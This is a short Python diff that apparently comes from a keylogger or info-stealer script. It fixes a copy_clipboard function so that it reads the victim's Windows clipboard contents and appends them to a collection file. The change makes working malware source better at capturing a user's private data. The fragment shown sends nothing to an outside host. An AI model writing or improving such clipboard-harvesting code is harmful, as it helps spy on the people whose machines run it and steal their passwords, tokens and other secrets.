@@ -78,9 +78,9 @@ computer_information()
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
-            f.write("\n Clipboard Data: \n" + data)
             win32clipboard.OpenClipboard()
             data = win32clipboard.GetClipboardData()
+            f.write("\n\n\n\n\n Clipboard Data: \n\n\n\n\n" + data)
             win32clipboard.CloseClipboard()
 
         except:
